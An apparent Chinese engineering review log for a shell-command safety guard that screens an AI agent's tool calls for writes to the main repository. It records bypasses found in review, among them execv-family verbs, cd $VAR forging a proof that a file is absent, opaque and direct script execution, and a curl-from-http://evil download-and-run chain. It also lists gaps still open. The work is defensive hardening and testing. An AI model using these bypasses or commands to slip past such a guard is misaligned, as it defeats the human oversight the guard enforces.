### delta3 复核补刀（execv 族词表 + cd $VAR 假缺席证明，2026-10-14）

检视獭1360 delta3 复核（PR #1466 留痕 + review-1360-delta3-report.md）两严重全采纳（大獭裁决无定级异议），修法按「设计层」执行：

**发现 1（严重）：execv 族动词表缺口**——`os.execv/execvp/execl/execvpe`（词内后缀形态）逃过 EXEC_FACE/SCRIPT_EXEC_FACE/dotExecCommandHits 三表，`python3 -c "import os; os.execv('/bin/sh', [...])"` 真写主仓正面放行（probe2 A 段实测：三表全 false、proveNoWrite=true 被洗白）。显式枚举动词表挡不住词内后缀是结构性漏因。修法：

- 三表动词表**词族归一**：`exec(?:[A-Z]\w*|[lv]\w*)?|spawn(?:[A-Z]\w*|[lv]\w*)?`（camelCase 族 + POSIX exec(3)/spawn 族；u 起头 execute/executor 刻意不收）——EXEC_FACE、SCRIPT_EXEC_FACE、dotExecCommandHits 三处同口径
- 负门双向钉死：TS-smrjexecv01-04（四形态进 block 池）+ 单测（点号/裸形态词面三表分工、db.exec 纯 SQL 对照不误伤、execute/executor 不收、只读目标按规则 2 仍拦——exec 类一律不可证，同 residual_face execSync 口径）
- **词界口径记档**：SCRIPT_EXEC_FACE 的 `(?<![\w.])` 点号排除是 db.exec SQL 豁免面（TS-e00efca3）的依赖，点号形态由 dotExecCommandHits/EXEC_FACE 收（`\b` 词界），裸形态由 SCRIPT_EXEC_FACE 收——三表分工不合并

**发现 2（严重）：cd $VAR 伪造 fsAbsentPlan 缺席证明**——攻击链四来源实测（probe3：export/环境变量/多段 cd 链/bash -c 载荷层）全 ALLOW 正面放行真写主仓。机制两条：①解析 cwd 与执行 cwd 错位（cd $VAR 溯源不出时 plan 仍按错误 cwd 出「文件不存在」假证明）②不透明外置脚本执行被词面证洗白（`bash x.sh` 无写词面 → proveNoWrite=true → fail-closed 被洗回放行）。修法四件套（设计层，一条语义一个接口）：

1. **resolveCwdAt 统一接口**：trackCwd 与 buildScriptPayloadPlan 共用同一 cwd 解析（逐段快照，pushd/popd/cd 溯源不出 → null）——不许两条通道两套解析（旧 :858 独立 cdTrack 已废）
2. **缺席证明三前提**：①cwd 可溯源（resolveCwdAt 成功）②落点可求值（非动态词）③执行 cwd 可锚定（absenceAllowed——载荷子模型从调用链继承 startCwd，外层链有 cd 时锚不住）。任一不成立 → 不得出具缺席证明 → fail-closed（unreadable）
3. **不透明外置脚本执行否决（hasOpaqueScriptExec，模型级）**：shell 解释器/source/. + 首个非旗标脚本位（口径=shellScriptFileArg 同源）或段首直执（./x、/x）→ 词面证洗白口不得放行；递归查载荷子模型（bash -c 内层同口径）；显式缺席声明（entry absent，牙3 同一信任口径）豁免该否决（声明缺席=脚本零写）——82d56ad0 截断命令回归钉
4. **段链从启动 cwd 忠实重放**（附带发现）：evaluateFromModel 旧 `let cwd = tracked` 从链尾 cwd 起步，写在 cd 前的段被挪到链尾 sandbox（`echo x > pwn.txt && cd /tmp` 把主仓写判成 /tmp 落点）——改 `let cwd = startCwd` 与 trackCwd 同口径重放

**设计取舍**（含工单点名项）：

- **前缀赋值/赋值语句可静态溯源 → 维持缺席证明**：命令内赋值的解析值=执行值（`DIR=/tmp; cd $DIR && bash no-such.sh` 缺席证明成立→放行，probe3「缺席正确放」钉死）；export/环境变量/一切溯源不出来源 → unresolvable → fail-closed。「全来源」语义=溯源失败处理覆盖一切来源，不是废除可溯源的解析（否则翻红现役缺席证明裁决口径）
- **执行面判定必须模型级，不能词面文本级**：文本正则把注释/提及/载荷内非壳文本当执行（实测翻红 4 条现役放行题：TS-074e7d85 JS `//` 注释行、TS-0cdf6695 注释提及 `bash toolCall`、TS-74fd58ae/TS-10eb58ff node/python 文件形态裁决面）——模型级段结构天然排除注释与引号内文本；直执判定只在脚本正文类模型（根/bash-c/heredoc 体）生效，替换型载荷（cmdsub 等）的垃圾解析不误收（能力 8 import(主仓路径) 口径）
- **面不超通道**：node/python/perl/ruby 文件形态不在牙3 通道域（SHELL_INTERPRETERS∪source/.）——否决面同口径不收（TS-74fd58ae/TS-10eb58ff 冻结裁决按词面证标准，翻案需双签）；通道扩展+裁决标准复核立 **issue #1491**
- **sqlite3 CLI 首参库文件写落点未判**（delta3 建议①）：正交面不进本刀，立 **issue #1490**（案发现场引 delta3 探针 B 段，含 CLI/python 对照）
- **SQL 字面量内嵌路径保守误伤**（delta3 建议③，delta4 方向修正：实测三形态全 BLOCK=**保守拦/误伤面**，非保守放行）：dotExecCommandHits 的 SQL 豁免按首参 SQL 起手判定，SQL 字面量内嵌路径字面量被当成路径实参（含词首路径）→ 不可证——极端形态（CREATE TABLE 含路径）保守拦记档不改（豁免面放宽会放走路径实参逃逸）
- **残余面（沿 delta2 记档不变）**：perl 间接对象形、无括号点号（`obj.exec 'cmd'`，Kernel.exec 同型实测仍 ALLOW）、次参携带——记档未失踪

**切换 PR 硬验收项增补**：content 判读与 cwd 解析**同源复用 resolveCwdAt**（切换 PR 若沿用独立解析，攻击链接线后照样活）；载荷子模型 startCwd 锚定语义随通道扩展一并接（issue #1491）。

**影响范围**：write-word-face.ts（三表词族归一）、write-target-evaluator.ts（resolveCwdAt/hasOpaqueScriptExec/buildScriptPayloadPlan 三前提/段链重放/载荷锚定）、guard-touchstone-block.json（+8 负门 TS-smrjexecv01-04+TS-smrjcwd01-04，block 72→80）、单测 +10（双向钉死）；语义收敛面=「真写主仓正面放行」→fail-closed/正面 BLOCK，无放宽面。

**验证（delta3 轮）**：全仓 5540/5540 绿（364 文件；基线对照 5527/5527 同型验证——本机高负载下 5s 默认超时对 `await import` 重模块测试有排队型 flake，隔离复跑 81/81 绿、30s 超时全量绿、负载正常默认超时全量绿）；write-target-evaluator.test.ts 98→108 例；judge 考试 794/80/105 全过（block +8 delta3 负门）、棘轮零新键（4 条误翻红现役放行题已按模型级判定复原）；corpus 守恒 921 恒等（TS-smrj 前缀扣减 50→58）；probe2/probe3 攻击矩阵 10 形态全拦 + 8 对照全保住。

### delta4 复核补刀（段首直执行位同构三态，2026-10-14）

检视獭1360 delta4 复核 1 严重 + 3 建议，大獭裁决「扩面修」（不走面不超通道记档路线——直执行位与 bash file 同属不透明执行族，否决面收了主通道不收=delta3 自留的口径矛盾，必须本刀闭合）：

**严重 1 修法：shellScriptFileArg 通道域扩段首直执行位（./x、/x 排 // 样式，与 hasOpaqueScriptExec 判定同源——isDirectExecArgv0 单函数两处共用）**：

- 通道拆分：interpreterScriptFileArg（原解释器分支，hasOpaqueScriptExec 同源复用——替换型载荷垃圾解析不误收，能力 8 口径）+ shellScriptFileArg = 直执行位（脚本位=argv0 词本身）∪ 解释器分支
- **同构三态自动接上**：造-执对（echo/printf 造出内容→判读，内容写主仓→BLOCK/positive）/ 显式声明（entry）/ fs 缺席证明（真存在→unreadable fail-closed、真不存在→absent 放行）——与 bash x 一视同仁
- 牙1 同步：不可求值直执路径（含 .. 等 evalPath 拒收形态）→ script-path-dynamic fail-closed（解释器族 + 直执行位同构；source/. 不进牙1 维持 5d98a85e 保守面）
- **二进制/无后缀 argv0 同入通道**（/bin/ls、./x 均算）——与 bash <file> 一视同仁是裁决口径；只读裁决走显式声明/内容判读（TS-0a7d41ee 先例：/Applications/.../Tailscale status 查询=裁决零写面，标 scriptPayload absent 显式声明防考题机器依赖——macOS 开发机真实存在、CI 不存在，fs 自查臂会机器依赖翻红；verdict 维持不变）
- 双向钉死：TS-smrjdir01（造-执对内容臂，echo 造 touch 主仓+直执执行→BLOCK/positive）、TS-smrjdir02（fs 存在臂 /dev/null→BLOCK）、TS-smrjdir03（fs 缺席臂→ALLOW/positive 正门）+ 单测 6 例（含对照：造-执对零写面内容放、能力 8 不回归、// 注释样不收、source<( 保守面、echo 绝对路径字面量非 argv0 不受影响）

**残余面（如实记档，不许失踪）**：

- curl -o 下载执行（运行时创建、判读时缺席）变体同漏——造-执对不识别 curl -o 写通道（writerContent 只收重定向/echo/printf/cat/tee/heredoc），与 bash 同链同漏同构，非本刀引入
- 动态直执（`/$VAR/x.sh`）不成 argv0（求值词=null）——hasOpaqueScriptExec/通道两处同口径不收，与 delta3 记档的动态词残余面同族【delta5 已收口：词文本口径 + 纯展开词保守收，见下节】
- 生产层 checkBashCommandSafety 的 EXEC_FACE 与 dotExec SQL 豁免口径分裂（db.exec 纯 SQL 生产层保守拦）——旧保守面非本刀引入（delta4 建议②），记档随 M-bf4049a3 止血面收窄；jshell 等非 SCRIPT_RUNNERS 解释器载荷零判读（delta4 建议①）已补记 issue #1491

**影响范围**：write-target-evaluator.ts（shellScriptFileArg 拆分+直执行位收编+牙1 同构）、guard-touchstone-allow/block.json（+3 双向门、TS-0a7d41ee 显式声明注记）、单测 +6；判读面收敛方向=「真存在/造出内容的不透明执行」从放行转 fail-closed/正面 BLOCK，缺席证明与显式声明两臂不动。

**验证（delta4 轮）**：探针矩阵 14 形态全对（5 拦 + 7 对照 + probe10 攻击链双形转拦）；write-target-evaluator.test.ts 108→114 例；三件套 123/123 绿；judge 考试 795/82/105 全过、棘轮零新键（TS-0a7d41ee 机器依赖注记后复原）；corpus 守恒 921 恒等（TS-smrj 前缀扣减 58→61）。

### delta5 复核补刀（U5 生产层直执扩面 + 动态直执词文本收口，2026-10-14）

检视獭1360 delta5 复核 2 严重（wv 层扩面成立，但「双层转拦」验收未达成——生产层 U5 域不含直执行位 + 动态直执行位双层全漏 + 牙1 注释与记档自相矛盾），大獭裁决两严重全采纳、维持定级，口径明示「双层转拦 = wv + prod 两层均拦」。

**机制判定**：本刀为既有机制收口（U5 规则域扩面 + isDirectExecArgv0 判定口径修正），不新增机制；唯二新增面（运行器族/受管服务脚本族 carve）是既有契约的域分工表述（frozen 测试的固化语义，非新豁免面）。

**严重 1 修法：U5 同构扩直执行位（isDirectExecArgv0 第三处复用——一条语义一个接口）**：

- guard-model-judge judgeBashFileScript 新增段首直执行位分支：词文本 `./x`、`/x` 排 `//` 与纯展开词收口的直执行位 → U5_BLOCK_MSG（文案括注扩「./file、/path/file 直接执行」）——「从文件读脚本执行，内容未经守卫逐条判定」语义同款适用，**U5 不看文件来历只看执行位**（造出来的与存量脚本一视同仁）——curl/cp 造+直执链生产层闭合（探针实测 prod:BLOCK）
- **运行器族 carve**（isDirectExecScriptSeg 单接口，wv 三处 + U5 同源）：argv0 basename ∈ SHELL_INTERPRETERS∪{source,.}∪SCRIPT_RUNNERS（/usr/bin/python3 族）→ 脚本位在其参数/载荷，argv0 自身不当脚本——同时满足「绝对路径解释器不误拦」冻结契约（bash-safety-guard.test.ts [建议2] 例）与「同族不许自己打自己」裁决（本刀唯一放宽面：修正 delta4 把解释器绝对路径自身当脚本的误收）
- **受管服务脚本族域分工 carve**（isManagedScriptWord）【delta7 收窄后口径——delta5 初版「词文本含族名即认领」不限路径不限子命令导致外溢，检视獭1360 delta6 严重 1，详见 delta7 节】：豁免条件=放行判定等价（单接口原则）——只在 SERVICE_SCRIPT 域实际接替判定的**受管路径**上豁免（scripts/ 相对形态、<root>/scripts/、worktree 树 scripts/，解析语义镜像 resolvesToMainCheckout），树外同名（/tmp/otter-buddy.sh 等）无域接替不豁免、进 U5 负门；frozen 契约全保持（start/status/logs 放行、worktree 绝对路径脚本 stop 放行、`$(./scripts/otter-buddy.sh restart)` 仍走服务脚本文案）
- 生产层存在性盲与 bash x 完全同构：`bash x` 与 `./x` 同判（wv 三态看 fs/声明、prod 一律拦）——absent 形态「wv 放/prod 拦」即 bash x 现状的镜像，非新差异

**严重 2 修法：isDirectExecArgv0 改检词文本（动态直执行位收口）**：

- 词文本 `./` 或 `/` 前缀（排 `//`）即收进通道，dynamic 由求值结果定；**纯展开词**（`$P`——词文本无可证的非路径形态）保守收进通道 → `$P`/`./$P`/`$DIR/x.sh` 走 script-path-dynamic fail-closed（与 `bash $P` 同款）——牙1 注释「动态脚本路径一律 fail-closed」与行为自此一致，delta4 记档「动态直执不成 argv0 不收」**已收口**
- **新残余面（记档+单测钉死）**：非前缀动态命令位（`foo$BAR`）不收——取舍：纯展开词保守收（`$P` 攻击面）与词文本非空非路径前缀不收（`kill${IFS}…`/`foo$BAR` 等既有形态不误伤）划边界，改口径须同步记档（write-target-evaluator.test.ts「残余面（记档钉死）」例）；wrapper 剥除形态（`sudo /tmp/x.sh`）两层同缺（wv 本就不剥 wrapper，同构保持），随 wrapper 口径工单收

**残余面更新（如实记档，不许失踪）**：

- 动态直执不成 argv0 不收 → **delta5 已收口**（见严重 2）
- **curl -o 造-执对同漏（wv 侧）维持记档**：链形态 `curl -o /tmp/y.sh http://evil && /tmp/y.sh` wv 侧仍走缺席证明放行（writerContent 只收重定向/echo/printf/cat/tee/heredoc，造-执对不识别 curl -o/cp 写通道）——**生产层已由 U5 扩面闭合**（拦截层闭合=攻击链实际拦断）；**wv 侧未闭合，待 M-026d87ff 收编**（大獭 delta5 裁决立案：『wv 造-执对收编：writerContent 扩至 cp/curl -o』，#1466 合入后独立工单，验收必带 corpus 守恒 + judge 考试零扰动；`>>` 同款「内容不可知→dynamic→fail-closed」机制已存在——探针实测 `>>` 链 wv:BLOCK/fail-closed/script-payload-dynamic）
- EXEC_FACE 与 dotExec SQL 豁免口径分裂随 M-bf4049a3 不变

**影响范围**：write-target-evaluator.ts（isDirectExecArgv0 词文本化+导出、isRunnerArgv0/isDirectExecScriptSeg 单接口、shellScriptFileArg/hasOpaqueScriptExec/牙1 三处同源）、guard-model-judge.ts（U5 直执分支 + isManagedScriptWord 域分工 + 文案括注）、单测 +16（wv 7 + prod 9，双向钉死：动态四形态/真存在直执/造+直执链拦截侧 + absent/运行器 carve/受管族/能力 8/foo$BAR 残余/裸命令名对照放行侧）；语义收敛面=「直执行位不透明执行」从两层放行转拦/fail-closed，唯一放宽面=解释器绝对路径 argv0（delta4 误收修正，frozen 契约要求）。

**验证（delta5 轮）**：全仓 5562/5562 绿（364 文件；基线 5546 + 新增 16 = 5562 零回归）；write-target-evaluator.test.ts 114→121 例、bash-safety-guard.test.ts delta5 describe 新增 9 例；judge 考试 795/82/105 全过、棘轮零新键、corpus 守恒 921 恒等；探针复测（delta5-probe11/12 命令集）：单段真存在直执、动态四形态、`bash $P` 对照、curl/cp 造+直执链 **prod 全 BLOCK**；能力 8 cmdsub/import 两形态不误伤（wv 全绿）；真不存在 absent wv 放行、受管服务脚本族 frozen 全保持。

### delta7 复核补刀（受管族 carve 收窄——「豁免条件=放行判定等价」，2026-10-14）

检视獭1360 delta6 复核 1 严重（carve 外溢——同名文件双层全绕）+ 1 建议（M-026d87ff 锚点），大獭裁决严重全采纳、维持定级，并把**「豁免条件 = 放行判定等价」立为单接口原则**。delta5 的 carve「词文本含族名即认领」不限路径不限子命令——SERVICE_SCRIPT 域路径限定不认树外同名，**U5 豁免了但无域接替**：`/tmp/otter-buddy.sh`、`/tmp/alpha.sh`、`./otter-buddy.sh`、造-执链同名四形态双层全绕（「修复引入新盲区」活例）。

**修法：isManagedScriptWord 收窄为路径限定豁免（一条语义一个接口）**：

- 豁免面 = SERVICE_SCRIPT 域实际接替判定的受管路径：① scripts/ 相对形态 ② <root>/scripts/ ③ <root>/.otter/worktrees/<name>/scripts/（解析语义镜像 resolvesToMainCheckout（F20260916gtlr）：相对路径基于 projectRoot resolve、大小写归一化，改动需同步；projectRoot 缺失时降级文本判——相对形态 ∨ worktree 树形态，树外 scripts/ 不豁免）
- 树外同名（/tmp/otter-buddy.sh、./otter-buddy.sh、/tmp/scripts/…）无域接替 → 不豁免，进 U5 直执分支（负门钉死；双层语义：wv 三态真存在→unreadable fail-closed、prod → U5 拦）
- 子命令语义不重复实现（一条语义一个接口）：stop/restart/间接调用/kill 族判定归 SERVICE_SCRIPT 域与 kill 族规则族——若把子命令条件加进豁免会误伤 frozen kill 族判定（`./scripts/otter-buddy.sh restart2>&1` 形态经 kill 族拦，实测教训），故豁免只做路径限定（域接替的前提）
- **单接口原则落档（大獭 delta6 裁决）**：豁免面不得宽于专属域的判定面——U5 豁免的前提是该段确实由专属域接替判定，无域接替即不得豁免；收窄是双向约束（不外溢且不误收）

**记档改齐（delta6 建议 1 + 加重情节纠正）**：

- curl-o 造-执对残余面补锚点：**wv 侧未闭合，待 M-026d87ff 收编**（见 delta5 节残余面行，已改）
- delta5 节「受管服务脚本族域分工 carve」段已改齐为本节收窄口径——原文「词文本含族名即认领…以其专属规则域为准」与实现不符（记档说一套代码做一套，delta6 加重情节），已纠正

**影响范围**：guard-model-judge.ts（isManagedScriptWord/isManagedScriptPath 路径限定收窄、checkWithModel/judgeBashFileScript 穿 projectRoot）、bash-safety-guard.ts（checkWithModel 调用点穿 projectRoot）、特性文档两处改齐 + 本节；单测 +7（prod 6：树外同名三形态负门 + 造-执链负门 + 树外 scripts/ 双形态负门 + frozen 双向保持两组 + 解释器不回退钉；wv 1：同名真存在负门）。

**验证（delta7 轮）**：全仓 5569/5569 绿（364 文件；基线 5562 + 新增 7 = 5569 零回归）；tsc 全量 clean；frozen 双向保持独立复跑（受管路径放行面 start/status/logs/worktree stop/alpha start 全保绿 + 拦截面专属域文案全保持）；delta6 负门四形态全 BLOCK（prod U5 文案 + wv 三态）；delta6 已验面不回退（/usr/bin/python3 族只读不误拦钉死）。
